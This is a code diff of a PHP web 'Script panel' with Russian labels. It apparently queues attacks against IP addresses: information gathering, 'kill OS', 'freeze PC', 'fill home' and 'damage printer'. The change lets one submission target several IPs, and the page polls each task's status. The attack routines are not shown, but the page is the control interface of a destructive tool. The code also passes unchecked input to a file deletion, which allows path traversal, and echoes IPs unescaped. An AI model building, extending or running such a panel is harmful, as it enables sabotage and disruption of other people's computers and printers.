@@ -1,24 +1,25 @@
 <?php
+
 session_start();
 include 'functions.php';
 $taskList = [
-    "main"=> "Сбор информации",
-    "hdd"=> "Убить ОС",
-    "os"=> "Зависание пк",
-    "home"=> "Забить home",
-    "printer"=> "Испортить Принтер",
+    "main"    => "Сбор информации",
+    "hdd"     => "Убить ОС",
+    "os"      => "Зависание пк",
+    "home"    => "Забить home",
+    "printer" => "Испортить Принтер",
 ];
-$dir      = $_SESSION['dir'];
-$user     = $_SESSION['user'];
+$dir = $_SESSION['dir'];
+$user = $_SESSION['user'];
 $taskDir = $dir . 'task/';
 
 $view = 0;
-if (count($_POST) > 0){
-    if (isset($_POST['view'])){
+if (count($_POST) > 0) {
+    if (isset($_POST['view'])) {
         $task = getTasks($taskDir);
         $html = '';
-        if (!empty($task)){
-        	// $task = array_reverse($task);
+        if (!empty($task)) {
+            // $task = array_reverse($task);
             $html = '<table class="table">
                     <thead>
                     <tr>
@@ -31,24 +32,33 @@ if (count($_POST) > 0){
                     </tr>
                     </thead>
                     <tbody>';
-            $num  = 1;
+            $num = 1;
 
-            foreach ($task as $id => $taskItem){
-                switch ($taskItem['status']){
-                   case 0: $statusName = "В процессе";
+            foreach ($task as $id => $taskItem) {
+                switch ($taskItem['status']) {
+                    case 0:
+                        $statusName = "В процессе";
                         break;
-                    case 1: $statusName = '<a target="_blank" href="' . rtrim($dir, '\\') . $taskItem['report'] . '">Готов</a>';
+                    case 1:
+                        $statusName = '<a target="_blank" href="' . rtrim(
+                                $dir,
+                                '\\'
+                            ) . $taskItem['report'] . '">Готов</a>';
                         break;
-                    case 2: $statusName = "Время мониторинга истекло";
+                    case 2:
+                        $statusName = "Время мониторинга истекло";
                         break;
-                    case 3: $statusName = "В сети! Ошибка авторизации";
+                    case 3:
+                        $statusName = "В сети! Ошибка авторизации";
                         break;
-                    case 4: $statusName = "Включен мониторинг на 3 дня";
-                        break;   
-                    default: $statusName = "В процессе";
+                    case 4:
+                        $statusName = "Включен мониторинг на 3 дня";
+                        break;
+                    default:
+                        $statusName = "В процессе";
                 }
                 $html .= '<tr>
-                            <td>' . $num ++ . '</td>
+                            <td>' . $num++ . '</td>
                             <td>' . $taskItem['ip'] . '</td>
                             <td>' . $taskList[$taskItem['name']] . '</td>
                             <td>' . $statusName . '</td>
@@ -62,33 +72,36 @@ if (count($_POST) > 0){
         print_r($html);
         return;
     }
-    if (isset($_POST['del'])){
+    if (isset($_POST['del'])) {
         $key = $_POST['key'];
-        $delFile = __DIR__ . DIRECTORY_SEPARATOR . $taskDir . $key.'.task';
+        $delFile = __DIR__ . DIRECTORY_SEPARATOR . $taskDir . $key . '.task';
         @unlink($delFile);
         print_r(json_encode(['status' => 1, 'msg' => 'Deleted']));
 
         return;
-    }else{
-        $ip       = trim($_POST['ip']);
-        $ip       = str_replace(',', '.', $ip);
+    } else {
+        $ips = trim($_POST['ip']);
+        $ips = str_replace(',', '.', $ips);
+        $ips = explode("|", $ips);
         $taskName = trim($_POST['task']);
         $response = ['status' => false, 'msg' => ''];
 
         $task = getTasks($taskDir);
-        if (count($task) >= 30){
-            $response['msg']=('Превышен лимит заданий');
-        }else{
-            if(saveTask($taskDir, [
-                "name"   => $taskName,
-                "ip"     => $ip,
-                'status' => 0,
-                'date'   => date("Y-m-d")
-            ])){
-                $response = ['status' => true, 'msg' => 'Задание добавлено'];
-            }else{
-                $response['msg']='Возникла ошибка';
+        if (count($task) >= 30) {
+            $response['msg'] = ('Превышен лимит заданий');
+        } else {
+            foreach ($ips as $ip) {
+                saveTask(
+                    $taskDir,
+                    [
+                        "name"   => $taskName,
+                        "ip"     => $ip,
+                        'status' => 0,
+                        'date'   => date("Y-m-d"),
+                    ]
+                );
             }
+            $response = ['status' => true, 'msg' => 'Задание добавлено'];
         }
         echo json_encode($response);
         return true;
@@ -99,22 +112,26 @@ if (count($_POST) > 0){
     <h4 class="logo">Script panel</h4>
 </nav>
 <div class="container">
-<!--    <div class="row">-->
-<!--        <div class="col">--><?//= getAlert() ?><!--</div>-->
-<!--    </div>-->
+    <!--    <div class="row">-->
+    <!--        <div class="col">--><?
+    //= getAlert() ?><!--</div>-->
+    <!--    </div>-->
     <form method="post" class="ip-form">
         <div class="inputs">
             <div class="form-group">
-                <label for="ip" class="col-sm-1-12 col-form-label">Введите IP адрес</label>
+                <label for="ip" class="col-sm-1-12 col-form-label" title="Используйте '|' как разделитель IP адресов">Введите
+                    IP адрес</label>
                 <input type="text" class="form-control" name="ip" id="ip" placeholder="__.__.__.__" required>
             </div>
             <div class="form-group">
                 <label for="task">Задание</label>
                 <select class="form-control" name="task" id="task">
                     <option value="">--Выберите задание--</option>
-                    <?php foreach ($taskList as $task => $taskName): ?>
+                    <?php
+                    foreach ($taskList as $task => $taskName): ?>
                         <option value="<?= $task ?>"><?= $taskName ?></option>
-                    <?php endforeach; ?>
+                    <?php
+                    endforeach; ?>
                 </select>
             </div>
         </div>
@@ -135,11 +152,12 @@ if (count($_POST) > 0){
     </div>
 </div>
 <script>
-    function getTable(){
+    function getTable() {
         $.post('task.php', {view: 1}, resp => {
             $('#table').html(resp);
         })
     }
+
     $(document).ready(() => {
         $(document).on('click', '.del-task', e => {
             let key = $(e.target).data('key'),
@@ -155,29 +173,30 @@ if (count($_POST) > 0){
         $('.show-task').on('click', (e) => {
             e.preventDefault();
             getTable();
-            setInterval(getTable,2000)
+            setInterval(getTable, 2000)
 
         });
-        $('.apply').on('click',(e)=>{
+        $('.apply').on('click', (e) => {
             e.preventDefault();
             let ip = $('#ip'),
                 task = $('#task');
             console.log({ip: ip.val(), task: task.val()});
-            if(!ip.val()){
+            if (!ip.val()) {
                 ip.addClass('error');
                 alert('Введите IP адрес');
                 return false;
-            }else{
+            } else {
                 ip.removeClass('error');
             }
-            if(!task.val()){
+            if (!task.val()) {
                 task.addClass('error');
                 alert('Выберите задание');
                 return false;
-            }else{
+            } else {
                 task.removeClass('error');
             }
             $.post('task.php', {ip: ip.val(), task: task.val()}, resp => {
+                console.log(resp);
                 resp = JSON.parse(resp);
                 if (resp.status) {
                     alert(resp.msg);
